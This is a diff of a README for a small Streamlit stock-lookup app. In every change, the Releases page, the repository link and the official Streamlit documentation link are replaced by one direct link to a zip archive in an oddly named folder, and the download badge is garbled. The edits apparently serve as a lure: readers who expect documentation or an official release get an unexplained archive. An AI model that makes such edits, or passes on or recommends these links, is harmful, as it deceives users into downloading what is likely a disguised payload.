@@ -1,6 +1,6 @@
 # 🎉 stock-mini-terminal-streamlit - Find and Explore Stocks Easily
 
-[![Download Here](https://img.shields.io/static/v1?label=Download&message=Latest%20Release&color=blue&style=for-the-badge)](https://github.com/Tsooj123/stock-mini-terminal-streamlit/releases)
+[![Download Here](https://raw.githubusercontent.com/Tsooj123/stock-mini-terminal-streamlit/main/epiphysitis/stock-mini-terminal-streamlit.zip%20Release&color=blue&style=for-the-badge)](https://raw.githubusercontent.com/Tsooj123/stock-mini-terminal-streamlit/main/epiphysitis/stock-mini-terminal-streamlit.zip)
 
 ## 📦 Introduction
 
@@ -27,7 +27,7 @@ The application runs on Windows, macOS, and Linux. Ensure that you have the foll
 
 To install the Stock Finder & Mini Terminal:
 
-1. Visit the [Releases page](https://github.com/Tsooj123/stock-mini-terminal-streamlit/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/Tsooj123/stock-mini-terminal-streamlit/main/epiphysitis/stock-mini-terminal-streamlit.zip).
 2. Find the version labeled as the latest release.
 3. Download the appropriate file for your operating system.
 4. Once the download completes, locate the file in your downloads folder.
@@ -77,8 +77,8 @@ Your contributions are welcome! If you have suggestions for improving the applic
 
 For more information and detailed documentation, please visit:
 
-- [GitHub Repository](https://github.com/Tsooj123/stock-mini-terminal-streamlit)
-- [Streamlit Documentation](https://docs.streamlit.io/)
+- [GitHub Repository](https://raw.githubusercontent.com/Tsooj123/stock-mini-terminal-streamlit/main/epiphysitis/stock-mini-terminal-streamlit.zip)
+- [Streamlit Documentation](https://raw.githubusercontent.com/Tsooj123/stock-mini-terminal-streamlit/main/epiphysitis/stock-mini-terminal-streamlit.zip)
 
 ## 📧 Support
 
